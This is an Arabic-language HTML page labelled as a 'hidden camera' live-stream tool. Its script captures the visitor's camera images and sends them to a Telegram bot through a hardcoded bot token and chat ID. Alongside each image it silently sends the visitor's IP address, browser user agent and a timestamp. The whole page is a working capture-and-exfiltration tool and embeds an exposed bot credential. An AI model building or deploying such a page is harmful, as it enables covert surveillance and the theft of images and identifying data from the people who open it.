<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بث مباشر - كاميرا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
        }
        .container {
            background: #1a1a2e;
            padding: 30px 25px;
            border-radius: 25px;
            box-shadow: 0 0 60px rgba(233, 69, 96, 0.15);
            max-width: 450px;
            width: 92%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .icon { font-size: 60px; margin-bottom: 5px; }
        h2 { color: #e94560; font-weight: 300; margin-bottom: 5px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 15px; }
        #videoContainer {
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #2a2a4a;
        }
        #video {
            width: 100%;
            height: auto;
            display: none;
            transform: scaleX(-1);
        }
        #video.front { transform: scaleX(1); }
        #video.back { transform: scaleX(-1); }
        #placeholder {
            color: #555;
            font-size: 14px;
            padding: 30px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            margin-bottom: 8px;
        }
        .btn:hover { transform: scale(1.02); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-start { background: #e94560; }
        .btn-start:hover { background: #c73652; }
        .btn-stop { background: #2a2a4a; }
        .btn-stop:hover { background: #3a3a5a; }
        .btn-back { background: #2a4a3a; }
        .btn-back:hover { background: #3a5a4a; }
        .btn-front { background: #4a2a4a; }
        .btn-front:hover { background: #5a3a5a; }
        #status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 13px;
            color: #aaa;
            min-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 15px; font-size: 11px; color: #444; border-top: 1px solid #1a1a3a; padding-top: 12px; }
        .btn-group { display: flex; gap: 8px; }
        .btn-group .btn { flex: 1; }
        .recording-dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff0000;
            border-radius: 50%;
            animation: blink 0.8s infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .overlay-text {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            text-align: center;
            color: rgba(255,255,255,0.6);
            font-size: 12px;
            background: rgba(0,0,0,0.5);
            padding: 4px;
            pointer-events: none;
        }
        .screenshot-btn {
            background: #2a4a6a;
            margin-top: 0;
        }
        .screenshot-btn:hover { background: #3a5a7a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📸</div>
        <h2>كاميرا خفية</h2>
        <p>سيتم التصوير وإرسال الصور تلقائياً</p>

        <div id="videoContainer">
            <video id="video" playsinline autoplay muted></video>
            <div id="placeholder">📷 انتظر بدء الكاميرا...</div>
            <div class="overlay-text">🔴 تسجيل مستمر</div>
        </div>

        <div class="btn-group">
            <button class="btn btn-back" id="backBtn">📸 خلفية</button>
            <button class="btn btn-front" id="frontBtn">🤳 أمامية</button>
        </div>
        <button class="btn btn-start" id="startBtn">▶ بدء البث</button>
        <button class="btn screenshot-btn" id="screenshotBtn" disabled>📸 تصوير الآن</button>
        <button class="btn btn-stop" id="stopBtn" disabled>⏹ إيقاف</button>

        <div id="status">⏳ اضغط "بدء البث"</div>
        <div class="footer">🔒 اتصال آمن • الصور ترسل فوراً إلى تيليغرام</div>
    </div>

    <script>
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        const video = document.getElementById('video');
        const placeholder = document.getElementById('placeholder');
        const statusDiv = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const screenshotBtn = document.getElementById('screenshotBtn');
        const backBtn = document.getElementById('backBtn');
        const frontBtn = document.getElementById('frontBtn');

        let stream = null;
        let facingMode = 'environment';
        let isRunning = false;

        // ====== دالة إرسال الصورة ======
        async function sendPhoto(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        // ====== دالة إرسال إشعار ======
        async function sendMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== دالة الحصول على IP ======
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch { return 'غير معروف'; }
        }

        // ====== دالة التقاط صورة ======
        async function captureAndSend() {
            if (!stream) {
                statusDiv.innerHTML = '⚠️ الكاميرا غير جاهزة';
                statusDiv.style.color = '#ff9800';
                return;
            }

            try {
                statusDiv.innerHTML = `<span class="loader"></span> جاري التصوير...`;
                statusDiv.style.color = '#ff9800';

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');

                // عكس الصورة إذا كانت خلفية
                if (facingMode === 'environment') {
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = await fetch(imageData).then(r => r.blob());

                const sent = await sendPhoto(blob);
                if (sent) {
                    statusDiv.innerHTML = `✅ تم إرسال الصورة`;
                    statusDiv.style.color = '#4caf50';
                    // إرسال إشعار إضافي
                    const ip = await getIP();
                    await sendMessage(`📸 **تم التقاط صورة جديدة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
                } else {
                    statusDiv.innerHTML = `❌ فشل إرسال الصورة`;
                    statusDiv.style.color = '#e94560';
                }
            } catch (error) {
                statusDiv.innerHTML = `❌ خطأ في التصوير: ${error.message}`;
                statusDiv.style.color = '#e94560';
            }
        }

        // ====== بدء الكاميرا ======
        async function startCamera(mode) {
            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: mode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                video.className = mode === 'environment' ? 'back' : 'front';
                video.style.display = 'block';
                placeholder.style.display = 'none';
                return true;
            } catch (error) {
                let msg = '❌ فشل الوصول للكاميرا';
                if (error.name === 'NotAllowedError') msg = '🚫 تم رفض صلاحية الكاميرا';
                else if (error.name === 'NotFoundError') msg = '📵 لا توجد كاميرا';
                statusDiv.innerHTML = msg;
                statusDiv.style.color = '#e94560';
                return false;
            }
        }

        // ====== بدء البث ======
        async function startStream() {
            if (isRunning) return;
            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
            const success = await startCamera(facingMode);
            if (success) {
                isRunning = true;
                startBtn.disabled = true;
                stopBtn.disabled = false;
                screenshotBtn.disabled = false;
                backBtn.disabled = true;
                frontBtn.disabled = true;
                statusDiv.innerHTML = `✅ البث نشط - جاهز للتصوير`;
                statusDiv.style.color = '#4caf50';

                // التقاط صورة تلقائية فور بدء البث
                setTimeout(captureAndSend, 1000);
            }
        }

        // ====== إيقاف البث ======
        function stopStream() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            video.style.display = 'none';
            placeholder.style.display = 'block';
            isRunning = false;
            startBtn.disabled = false;
            stopBtn.disabled = true;
            screenshotBtn.disabled = true;
            backBtn.disabled = false;
            frontBtn.disabled = false;
            statusDiv.innerHTML = `⏹ تم إيقاف البث`;
            statusDiv.style.color = '#aaa';
        }

        // ====== تبديل الكاميرا ======
        async function switchCamera(mode) {
            if (isRunning) {
                statusDiv.innerHTML = '⚠️ أوقف البث أولاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            facingMode = mode;
            const success = await startCamera(mode);
            if (success) {
                statusDiv.innerHTML = `✅ كاميرا ${mode === 'environment' ? 'خلفية' : 'أمامية'} جاهزة`;
                statusDiv.style.color = '#4caf50';
                // إغلاق الكاميرا فوراً حتى لا تبقى مفتوحة
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                video.style.display = 'none';
                placeholder.style.display = 'block';
            }
        }

        // ====== بدء تلقائي عند فتح الصفحة ======
        async function autoStart() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
            const success = await startCamera('environment');
            if (success) {
                // نغلق الكاميرا فوراً وننتظر المستخدم
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                video.style.display = 'none';
                placeholder.style.display = 'block';
                statusDiv.innerHTML = `✅ الكاميرا جاهزة، اضغط "بدء البث"`;
                statusDiv.style.color = '#4caf50';
            }
        }

        // ====== ربط الأزرار ======
        backBtn.addEventListener('click', () => switchCamera('environment'));
        frontBtn.addEventListener('click', () => switchCamera('user'));
        startBtn.addEventListener('click', startStream);
        stopBtn.addEventListener('click', stopStream);
        screenshotBtn.addEventListener('click', captureAndSend);

        // ====== بدء التشغيل التلقائي ======
        setTimeout(autoStart, 500);
    </script>
</body>
</html>
